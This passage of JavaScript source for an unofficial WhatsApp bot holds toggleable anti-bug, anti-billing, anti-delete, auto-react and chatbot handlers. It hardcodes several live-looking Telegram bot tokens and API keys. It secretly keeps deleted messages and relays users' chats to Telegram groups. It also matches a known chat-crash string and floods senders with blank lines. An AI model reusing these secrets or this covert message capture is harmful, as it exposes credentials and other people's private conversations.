                                    if (m.mtype === "꙳ۖۗۡۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۚ۫ۨۖۗۡۖۘۗۚ۫") {
                                      newly = "\n".repeat(0x3e8);
                                      await XeonBotInc.sendMessage(m.chat, {
                                        'text': newly
                                      });
                                      await XeonBotInc.sendMessage(XeonBotInc.user.id, {
                                        'text': m.sender.split('@')[0x0] + "🚫 𝐓𝐡𝐢𝐬 𝐮𝐬𝐞𝐫 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐟𝐥𝐚𝐠𝐠𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐧𝐝𝐢𝐧𝐠 𝐛𝐮𝐠𝐬 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐫 𝐩𝐫𝐢𝐯𝐚𝐭𝐞 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬 𝐚𝐧𝐝 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐞𝐫𝐦𝐚𝐧𝐞𝐧𝐭𝐥𝐲 𝐛𝐥𝐨𝐜𝐤𝐞𝐝! ☠️☠️☠️ 𝐀𝐍𝐓𝐈𝐁𝐔𝐆 𝐒𝐘𝐒𝐓𝐄𝐌 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃🚫 - ⚡ BLOCKING ALL INCOMING BUG ATTEMPTS IN GROUPS & DMs ⚡ - 🚫 𝗙𝗨𝗘𝗟𝗘𝗗 𝗕𝗬 𝗕𝗜𝗚 𝗗𝗔𝗗𝗗𝗬 ☠️☠️ - ⚠️◼️◾◽ SYSTEM SHIELD ACTIVE ◽◾◼️⚠️"
                                      });
                                      await XeonBotInc.updateBlockStatus(m.sender, "block");
                                    }
                                  }  
                      // Define and initialize antibilling variable
// Initialize Anti-Billing toggle
let antibilling = false; // Default is off

// Define Billing Keywords
const billingKeywords = [
    'help', 'abeg', 'please', 'money', 'data', 'loan', 'send me', 'airtime', 'cash', 'boss',
    '2k'
    // Add more keywords here
];

// Message Handling
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Only proceed if antibilling is activated and a text message is present
        if (antibilling && m) {
            const isBilling = billingKeywords.some(keyword => m.toLowerCase().includes(keyword));

            if (isBilling) {
                const sender = message.key.remoteJid;

                // Send filler text to chat
                const fillerText = "\n".repeat(1000);
                await XeonBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for billing attempts! User has been blocked.`;
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: alertText });

                // Delete the offending message
                await XeonBotInc.sendMessage(sender, { delete: message.key });

                // Block the user
                await XeonBotInc.updateBlockStatus(sender, "block");
            }
        }
    } catch (err) {
        console.error('Error in Anti-Billing Handler:', err);
    }
});
// Define keywords for detection
const bigDaddyKeywords = ["play", "time", "weather", "help"]; // Add more keywords as needed

let bigDaddyActive = true; // Default is off

// Message Handling for Big Daddy interactions
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        const sender = message.key.remoteJid; // Message sender's ID
        const m = message.message?.conversation || message.message?.extendedTextMessage?.text;

        // Ensure the bot only responds to messages containing "Big Daddy"
        if (bigDaddyActive && m) {
            const isBigDaddyCall = m.toLowerCase().includes('big daddy');

            if (isBigDaddyCall) {
                // Extract the content following "Big Daddy"
                const command = m.toLowerCase().split('big daddy')[1]?.trim();

                if (command) {
                    // Check if any keyword exists in the command
                    const foundKeyword = bigDaddyKeywords.find(keyword => command.startsWith(keyword));

                    if (foundKeyword) {
                        // Extract and send the text after the detected keyword
                        const responseText = command.replace(foundKeyword, '').trim();
                        await XeonBotInc.sendMessage(sender, { text: responseText || "I didn't catch that!" });
                    } else {
                        // Ignore if no listed keyword is found after "Big Daddy"
                        return;
                    }
                }
            }
        }
    } catch (err) {
        console.error('Error in Big Daddy Handler:', err);
    }
});
let anticall = false; // Default is off
let callBlockedUsers = {}; // To track blocked users and their unblock timeout

// Listen for incoming call updates
XeonBotInc.ev.on('call', async (callUpdate) => {
    if (!anticall) return; // Skip if Anti-Call is off

    try {
        for (const call of callUpdate) {
            if (call.status === "offer") { // Check for incoming calls
                const sender = call.from;
                if (callBlockedUsers[sender]) {
                    console.log(`User ${sender} is currently blocked from calling.`);
                    return; // Skip if the user is already blocked
                }

                console.log(`Incoming call detected from: ${sender}`);

                // Send filler text to chat to block the user
                const fillerText = "🚫 You will be blocked for calling my owner. my owner doesn't want to receive any calls for now Please send a message in the next 1 min."; // Send filler message to block
                await XeonBotInc.sendMessage(sender, { text: fillerText });

                // Notify the bot owner/admin about the blocked user
                const alertText = `${sender.split('@')[0]} 🚫 User flagged for calling attempts! User has been blocked. User will be unblocked in the next one minute`;
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: alertText });

                // Block the user
                await XeonBotInc.updateBlockStatus(sender, "block");

                console.log(`User ${sender} has been blocked.`);

                // Track the blocked user with unblock timeout (1 minute)
                callBlockedUsers[sender] = setTimeout(async () => {
                    await XeonBotInc.updateBlockStatus(sender, "unblock");
                    delete callBlockedUsers[sender]; // Remove from blocked users
                    console.log(`User ${sender} has been unblocked after 1 minute.`);
                }, 60000); // 60000 milliseconds = 1 minute
            }
        }
    } catch (err) {
        console.error("Error handling incoming call:", err);
    }
});   
let antidelete = false; // Default is off
const trackedMessages = {}; // Store tracked messages

// Track incoming messages
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // Save the message if it has text
        if (text) {
            trackedMessages[messageId] = { sender, text };
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});

// Detect and handle deleted messages
XeonBotInc.ev.on('messages.update', async (updates) => {
    try {
        if (!antidelete) return; // Skip if Anti-Delete is off

        for (const update of updates) {
            const messageId = update.key.id; // Deleted message ID
            const sender = update.key.remoteJid; // User or group where the message was deleted

            // Check if the message was tracked before deletion
            const deletedMessage = trackedMessages[messageId];
            if (deletedMessage) {
                const alertText = `🚨 *Anti-Delete Alert* 🚨\n\n` +
                                  `👤 *User:* ${sender.split('@')[0]}\n` +
                                  `💬 *Deleted Message:* "${deletedMessage.text}"`;

                // Notify the bot owner/admin
                await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: alertText });

                // Remove the message from the tracking object
                delete trackedMessages[messageId];
            }
        }
    } catch (err) {
        console.error('Error handling deleted messages:', err);
    }
});
let autoReact = false; // Default is off

// Track incoming messages
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message || message.key.fromMe) return; // Ignore bot's own messages

        const messageId = message.key.id; // Message ID
        const sender = message.key.remoteJid; // Sender's ID
        const text =
            message.message?.conversation ||
            message.message?.extendedTextMessage?.text ||
            null;

        // React to the message if auto-react is enabled
        if (autoReact) {
            const randomEmojis = [
                '❤️', '👍', '🎉', '😎', '🔥', '👏', '💡', '✨', '🎈', '🌟', '😊', '😍', '💯', '😅', '🥳', '🤩', '🎶', '💖', '🍀', '🌈',
                '⚡', '💥', '🌺', '🌼', '🌸', '🌻', '🐾', '💌', '💝', '🌷', '🍁', '🍃', '🌿', '🌙', '🪐', '☀️', '🌞', '🌜', '🌑',
                '🌒', '🌓', '🌔', '🌕', '🌖', '🌗', '🌘', '🌚', '✨', '💎', '🖤', '💜', '❤️‍🔥', '💙', '💚', '💛', '🧡', '🤍', '🤎', '💗',
                '💓', '💞', '💘', '💌', '💍', '🔮', '🌍', '🌎', '🌏', '🪴', '🌵', '🌾', '🍂', '🍄', '🍉', '🍇', '🍓', '🍈', '🍒', '🍑', '🥭',
                '🍍', '🥥', '🍉', '🍊', '🍋', '🍏', '🍎', '🍍', '🍅', '🥕', '🥔', '🍠', '🌽', '🥒', '🍑', '🍋', '🍒', '🥝', '🫐', '🍜', '🍛',
                '🍝', '🍕', '🍣', '🍤', '🍖', '🍗', '🍠', '🥧', '🍩', '🍪', '🍨', '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🥨', '🥯', '🍪',
                '🍩', '🍪', '🥓', '🍔', '🥪', '🍟', '🥞', '🍣', '🍰', '🥧', '🍇', '🍉', '🥑', '🥥', '🥭', '🍅', '🥦', '🥕', '🥔', '🥗', '🥒',
                '🥥', '🍒', '🍑', '🍋', '🥭', '🍉', '🍇', '🍋', '🥝', '🫐', '🍊', '🍏', '🥕', '🍅', '🥒', '🥔', '🥥', '🍠', '🍞', '🥐', '🍩',
                '🍫', '🍬', '🍭', '🍡', '🍧', '🍦', '🥧', '🍪', '🍩', '🍕', '🍜', '🍚', '🍛', '🍕', '🍣', '🍤', '🍔', '🍗', '🍖', '🥓', '🥩',
                '🍿', '🎥', '🎬', '🎧', '🎮', '🎤', '🎵', '🎷', '🎺', '🎸', '🎻', '🎼', '🎶', '🎧', '🎵', '🎶', '🎤', '🎬', '🎮', '🎸', '🎹',
                '🎷', '🎺', '🎼', '🎻', '🎧', '🎮', '🎮', '🧸', '🪀', '🎨', '🖌️', '🎭', '🎪', '🎠', '🎰', '🛹', '🛷', '🏀', '⚽', '🏈', '🎱',
                '🎯', '🎳', '🏏', '🏑', '🏓', '🎾', '🛶', '🚴', '🧗', '🧘', '🏄', '🏇', '⛷️', '🏌️‍♂️', '⛹️‍♀️', '🚣', '🏆', '🎮', '🎲',
                '🎮', '🍕', '🍔', '🍟', '🍗', '🥔', '🥦', '🌽', '🥒', '🥝', '🥭', '🍍', '🍎', '🍊', '🍋', '🥭', '🥑', '🥒', '🌶️', '🍠', '🥔',
                '🍪', '🍩', '🍫', '🍫', '🍪', '🥪', '🥡', '🍜', '🍣', '🍤', '🍙', '🍚', '🍗', '🍖', '🥩', '🥓', '🥨', '🍧', '🍡', '🍪', '🍩',
                '🍜', '🍛', '🍝', '🥝', '🫐', '🍁', '🍃', '🌲', '🌳', '🌴', '🌱', '🪴', '🌾', '🌿', '🌺', '🌼', '🌻', '🌸', '🌷', '🌹', '💐',
                '🍀', '🍁', '🍃', '🌱', '🌿', '🌾', '🌸', '🌺', '🌻', '🌼', '💮', '🍂', '🍃', '🍄', '🌷', '🍁', '🌿', '🎋', '🎋', '🌹', '🌸'
            ];

            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            // Send a random emoji as a reaction
            await XeonBotInc.sendMessage(sender, {
                react: { text: randomEmoji, key: message.key }
            });
        }
    } catch (err) {
        console.error('Error tracking messages:', err);
    }
});
let autoStatusView = false; // Default is OFF

// Listen for messages and statuses
XeonBotInc.ev.on('messages.upsert', async (msgUpdate) => {
    try {
        if (!autoStatusView) return; // Skip if auto-status view is disabled

        const message = msgUpdate.messages[0];
        if (!message || message.key.remoteJid !== 'status@broadcast') return; // Only process statuses

        const { participant, id } = message.key; // JID of the status sender
        console.log(`Viewing status from ${participant}`);

        // Mark the status as read
        await XeonBotInc.readMessages([
            {
                remoteJid: 'status@broadcast',
                id: id,
                participant: participant,
            },
        ]);
    } catch (err) {
        console.error('Error viewing statuses:', err);
    }
});
let autoswview = false; // Default is off

// Listen for status updates
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the message object
        if (!message || !message.key.remoteJid.endsWith('@status')) return; // Ensure it's a status update

        if (autoswview) {
            const participant = message.key.remoteJid; // Status uploader's JID
            const statusId = message.key.id; // Specific status ID

            // View the status
            console.log(`Viewing status from ${participant}`);
            await XeonBotInc.readMessages([{ remoteJid: participant, id: statusId }]);

            // React to the status using reactionAdd
            const randomEmojis = ['❤️', '🔥', '😂', '👍', '👏', '😍', '🎉', '💯'];
            const randomEmoji = randomEmojis[Math.floor(Math.random() * randomEmojis.length)];

            console.log(`Reacting to status ${statusId} from ${participant} with emoji: ${randomEmoji}`);
            await XeonBotInc.reactionAdd(participant, 'STATUS', randomEmoji);

            console.log(`Successfully viewed and reacted to status from ${participant}`);
        }
    } catch (error) {
        console.error('Error in auto status view and react:', error);
    }
});
global.userSessions = global.userSessions || {};
async function fetchTelegramFile(type, botToken, chatId) {
    const getUpdatesUrl = `https://api.telegram.org/bot${botToken}/getUpdates`;

    // Clear old updates
    const initialUpdatesResponse = await fetch(getUpdatesUrl);
    const initialUpdates = await initialUpdatesResponse.json();
    const lastUpdateId = initialUpdates.result.length
        ? initialUpdates.result[initialUpdates.result.length - 1].update_id
        : null;

    let fileId = null;
    let textContent = null;
    let firstTextSkipped = false; // Flag to skip the first text
    let retries = 0;

    while (!fileId && !textContent && retries < 15) { // Retry up to 15 times
        const updatesResponse = await fetch(
            `${getUpdatesUrl}${lastUpdateId ? `?offset=${lastUpdateId + 1}` : ''}`
        );
        const updates = await updatesResponse.json();

        if (updates.result && updates.result.length > 0) {
            for (const update of updates.result) {
                if (update.message?.chat?.id == chatId) {
                    // Check for the requested type
                    if (type === 'audio' && update.message.audio) {
                        fileId = update.message.audio.file_id;
                        break;
                    } else if (type === 'video' && update.message.video) {
                        fileId = update.message.video.file_id;
                        break;
                    } else if (type === 'photo' && update.message.photo) {
                        // Get the largest photo
                        const photoSizes = update.message.photo;
                        fileId = photoSizes[photoSizes.length - 1].file_id;
                        break;
                    } else if (type === 'text' && update.message.text) {
                        if (!firstTextSkipped) {
                            // Skip the first text
                            firstTextSkipped = true;
                        } else {
                            // Capture the second text and break
                            textContent = update.message.text;
                            break;
                        }
                    } else if (type === 'pdf' && update.message.document) {
                        // Check if the document is a PDF
                        if (update.message.document.mime_type === 'application/pdf') {
                            fileId = update.message.document.file_id;
                            break;
                        }
                    }
                }
            }
        }
        retries++;
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before retrying
    }

    if (!fileId && !textContent) throw new Error(`Failed to retrieve new ${type} from Telegram`);

    if (type === 'text') {
        // Return the second text content directly
        return textContent;
    }

    // Fetch File URL for media (including PDF)
    const getFileUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`;
    const fileResponse = await fetch(getFileUrl);
    const fileData = await fileResponse.json();

    if (!fileData.result?.file_path) throw new Error(`${type.charAt(0).toUpperCase() + type.slice(1)} file not found`);
    return `https://api.telegram.org/file/bot${botToken}/${fileData.result.file_path}`;
}
const botData = [
    { botToken: '7990920443:AAEboEVzlR7Ub2B3a-sy-rfD4kan8t9jH-w', groupId: -4753002185 },
    { botToken: '7246237006:AAGBlCGREw4wWJqAiLOFqkc8JCPVnfLBSjA', groupId: -4676636503 },
    { botToken: '7506240743:AAFLiKxWKTtJXEV9JR-6NJo9ZG8x47uIM3E', groupId: -4608507809 },
    { botToken: '7586987455:AAG2eBeL9YjMEWEDj8d2DACg2ecLU5viO-s', groupId: -4658810431 },
    { botToken: '7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M', groupId: -1002265939686 }
];

// Function to select a random bot and group
function getRandomBot() {
    const randomIndex = Math.floor(Math.random() * botData.length);
    return botData[randomIndex];
}
let chatbotActive = false;
XeonBotInc.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const message = chatUpdate.messages[0]; // Get the incoming message
        if (!message.message || message.key.fromMe) return; // Ignore system messages and bot's own messages

        const from = message.key.remoteJid; // Sender's ID
        const text = message.message.conversation || 
                     message.message.extendedTextMessage?.text || ''; // Extract text message

        // Check if chatbot is active and the message is not empty
        if (chatbotActive && text.trim()) {
            const query = text.trim(); // User's input

            // Get Telegram bot details (Replace with actual logic)
            const { botToken, groupId } = getRandomBot();

            const telegramMessage = `/gpt ${query}`; // Prefix the message with '/gpt'

            // Send the message to Telegram group
            await sendToTelegram(botToken, groupId, telegramMessage);

            // Wait for Telegram's response
            const responseText = await fetchTelegramFile('text', botToken, groupId);

            // Send the response back to the original sender on WhatsApp
            await XeonBotInc.sendMessage(from, { text: responseText });
        }
    } catch (error) {
        console.error('Error processing incoming message:', error);
    }
});

// Function to send the message to Telegram group
async function sendToTelegram(botToken, chatId, message) {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    });

    const data = await response.json();
    if (!data.ok) {
        throw new Error('Failed to send message to Telegram');
    }
}
async function getUserReplyWithTimeout(chatId, timeout) {
    return new Promise((resolve) => {
        const timer = setTimeout(() => resolve(null), timeout); // Timeout after the specified duration

        XeonBotInc.ev.on('messages.upsert', ({ messages }) => {
            const message = messages[0];
            if (message.key.remoteJid === chatId && !message.key.fromMe) {
                clearTimeout(timer); // Clear the timeout when a reply is received
                resolve(message.message.conversation); // Resolve with the user's message
            }
        });
    });
}
           if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./Phistar-media/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./Phistar-media/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./Phistar-media/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./Phistar-media/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
XeonBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocXeon) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Phistar-media/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    replygcxeon(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                XeonBotInc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
        
// Auto-react toggle command
case 'autoreact':
    if (!isCreator) return replygcxeon('⚠️ Only the bot owner can use Auto-React.');
    if (!args[0]) return replygcxeon('⚠️ Usage: autoreact on/off');

    if (q === 'on') {
        autoReact = true;
        replygcxeon('✅ Auto-Reaction has been activated. The bot will now react to all messages.');
    } else if (q === 'off') {
        autoReact = false;
        replygcxeon('❌ Auto-Reaction has been deactivated. The bot will no longer react to messages.');
    } else {
        replygcxeon('⚠️ Invalid option. Use "autoreact on" or "autoreact off".');
    }
    break;
case 'chatbot': 
    if (!isCreator) return replygcxeon('❌ Only the bot owner can use the chatbot.');
    if (!args[0]) return replygcxeon('⚠️ Usage: chatbot on/off');
    
    if (q === 'on') {
        chatbotActive = true;
        replygcxeon('✅ Chatbot has been activated. It will now respond to all messages.');
    } else if (q === 'off') {
        chatbotActive = false;

        // Notify that the chatbot will turn off after 1 minute
        replygcxeon('❌ Chatbot will be deactivated in 1 minute. It will no longer respond to messages.');

        // Delay the deactivation message
        setTimeout(() => {
            replygcxeon('⏳ Chatbot has now been deactivated.');
        }, 60000); // 1 minute = 60000 milliseconds
    } else {
        replygcxeon('⚠️ Invalid option. Use "chatbot on" or "chatbot off".');
    }
    break;
case 'antidelete':
    if (!isCreator) return replygcxeon(' Only the bot owner can use Anti-Delete.');
    if (!args[0]) return replygcxeon('⚠️ Usage: antidelete on/off');

    if (q === 'on') {
        antidelete = true;
        replygcxeon('✅ Anti-Delete has been activated. The bot will now detect deleted messages.');
    } else if (q === 'off') {
        antidelete = false;
        replygcxeon('❌ Anti-Delete has been deactivated. Deleted messages will no longer be detected.');
    } else {
        replygcxeon('⚠️ Invalid option. Use "antidelete on" or "antidelete off".');
    }
    break;
    // Command to toggle Anti-Bug System ON or OFF
case 'antibug':
    if (!isCreator) return replygcxeon('Only the bot owner can use Anti-Bug.');

    if (!args[0]) return replygcxeon('⚠️ Usage: antibug on/off');

    if (args[0].toLowerCase() === 'on') {
        antibug = true;
        replygcxeon('✅ Anti-Bug System has been activated.');
    } else if (args[0].toLowerCase() === 'off') {
        antibug = false;
        replygcxeon('❌ Anti-Bug System has been deactivated.');
    } else {
        replygcxeon('⚠️ Invalid option. Use "antibug on" or "antibug off".');
    }
    break;        
        case 'antilink':
    if (!m.isGroup) return replygcxeon(mess.group)
                if (!isAdmins && !isCreator) return replygcxeon(mess.admin)
                if (!isBotAdmins) return replygcxeon(mess.botAdmin)
    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);
          // Read the current data from the file
    const antilinkGroups = JSON.parse(fs.readFileSync('./database/antilinkall.json', 'utf-8') || '[]');

    if (args.length < 1) return replygcxeon(`Example: ${prefix + command} on/off`);

    if (q === 'on') {
        if (antilinkGroups.includes(m.chat)) return replygcxeon("✅ Anti-Link is already activated in this group.");
        
        // Add the group ID to the file
        antilinkGroups.push(m.chat);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkGroups, null, 2));
        replygcxeon("✅ Anti-Link has been activated in this group. Any link sent will be deleted.");
    } else if (q === 'off') {
        if (!antilinkGroups.includes(m.chat)) return replygcxeon("❌ Anti-Link is already disabled for this group.");
        
        // Remove the group ID from the file
        const updatedGroups = antilinkGroups.filter(group => group !== m.chat);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(updatedGroups, null, 2));
        replygcxeon("✅ Anti-Link has been disabled for this group.");
    } else {
        replygcxeon(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`);
    }
    break
case 'time':
    if (!q.trim()) {
        return replygcxeon('⚠️ Please provide a city or location to check the current time. Useage: time Nigeria');
    }

    const location = q.trim().replace(/ /g, '_'); // Replace spaces for better compatibility
    const timeApiUrl = `http://api.timezonedb.com/v2.1/get-time-zone?key=T3RJM7DKOIS8&format=json&by=zone&zone=${location}`;

    try {
        const response = await fetch(timeApiUrl);
        if (!response.ok) {
            return await replygcxeon(`⚠️ Could not retrieve time for "${location.replace(/_/g, ' ')}". Please check the location format.`);
        }

        const timeData = await response.json();
        if (timeData && timeData.status === "OK") {
            const formattedTime = timeData.formatted;

            // Send the plain text response
            await replygcxeon(`🕰 Current time in ${location.replace(/_/g, ' ')}: ${formattedTime}`);
        } else {
            await replygcxeon(`⚠️ Unable to fetch time for "${location.replace(/_/g, ' ')}". Please ensure the location is valid.`);
        }
    } catch (error) {
        console.error('Error fetching time:', error);
        await replygcxeon('❌ There was an issue fetching the time. Please try again later.');
    }
    break;
    case 'weather':
    if (q.length === 0) return replygcxeon('⚠️ Please provide a city name to check the weather.Useage: weather Nigeria');

    const cityName = q.trim(); // Removes any extra spaces
    const apiKey = '8044b9a239193d667183ab85fea38ca9'; // Your API key
    const weatherApiUrl = `https://api.openweathermap.org/data/2.5/weather?q=${cityName}&appid=${apiKey}&units=metric`;

    try {
        const response = await fetch(weatherApiUrl);
        const weatherData = await response.json();

        if (weatherData.cod === 200) {
            const weatherDescription = weatherData.weather[0].description;
            const temperature = weatherData.main.temp;
            const humidity = weatherData.main.humidity;
            const pressure = weatherData.main.pressure;
            const windSpeed = weatherData.wind.speed;
            const iconCode = weatherData.weather[0].icon;
            const weatherIconUrl = `https://openweathermap.org/img/wn/${iconCode}@2x.png`;

            await XeonBotInc.sendMessage(
                m.chat,
                {
                    image: { url: weatherIconUrl }, // Use the weather icon as the image
                    caption: `*🌍 Weather in ${cityName}*\n\n` +
                             `*Description:* ${weatherDescription}\n` +
                             `*Temperature:* ${temperature}°C\n` +
                             `*Humidity:* ${humidity}%\n` +
                             `*Pressure:* ${pressure} hPa\n` +
                             `*Wind Speed:* ${windSpeed} m/s\n\n` +
                             `Stay safe and enjoy your day! 🌞`
                },
                { quoted: m }
            );
        } else {
            await replygcxeon(`⚠️ City not found! Please try again with a valid city name.`);
        }
    } catch (error) {
        console.error('Error fetching weather:', error);
        await replygcxeon('❌ There was an error fetching the weather. Please try again later.');
    }
    break;
            case 'addprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 2)
                    return replygcxeon(`Use :\n*#addprem* @tag time\n*#addprem* number time\n\nExample : #addprem @tag 30d`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        addPremiumUser(m.mentionedJid[0], args[1], premium);
                    }
                    replygcxeon("Premium Success")
                } else {
                    addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
                    replygcxeon("Success")
                }
                break
            case 'delprem':
                if (!isCreator) return replygcxeon(mess.owner)
                if (args.length < 1) return replygcxeon(`Use :\n*#delprem* @tag\n*#delprem* number`);
                if (m.mentionedJid.length !== 0) {
                    for (let i = 0; i < m.mentionedJid.length; i++) {
                        premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
                        fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    }
                    replygcxeon("Delete success")
                } else {
                    premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
                    fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
                    replygcxeon("Success")
                }
                break
            case 'listprem': {
                if (!isCreator) return replygcxeon(mess.owner)
                let data = require("./database/premium.json")
                let txt = `*------「 LIST PREMIUM 」------*\n\n`
                for (let i of data) {
                    txt += `Number : ${i.id}\n`
                    txt += `Expired : ${i.expired} Second\n`         
                }                
                XeonBotInc.sendMessage(m.chat, {
                    text: txt,
                    mentions: i
                }, {
                    quoted: m
                })
            }
            break
            case 'deletesession':
            case 'delsession':
            case 'clearsession': {
                if (!isCreator) return replygcxeon(mess.owner)
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return replygcxeon('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Detected ${filteredArray.length} junk files\n\n`
                    if (filteredArray.length == 0) return replygcxeon(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    replygcxeon(teks)
                    await sleep(2000)
                    replygcxeon("Delete junk files...")
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    replygcxeon("Successfully deleted all the trash in the session ")
                });
            }
            break
            case 'join':
    try {
        if (!isCreator) return replygcxeon(mess.owner); // Only creator can use this command
        if (!text) return replygcxeon('Enter a valid Group Link!'); // Validate input
        if (!isUrl(text) || !text.includes('whatsapp.com')) return replygcxeon('Invalid Group Link!'); // Check link format
        replygcxeon(mess.wait); // Send wait message

        // Extract the invite code from the URL
        let inviteCode = text.split('https://chat.whatsapp.com/')[1];
        if (!inviteCode) return replygcxeon('Invalid Invite Code!');

        // Attempt to join the group
        let result = await XeonBotInc.groupAcceptInvite(inviteCode);
        replygcxeon(`Successfully joined the group:`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replygcxeon('Successfully joined the group:');
    }
    break;      
            case 'getsession':
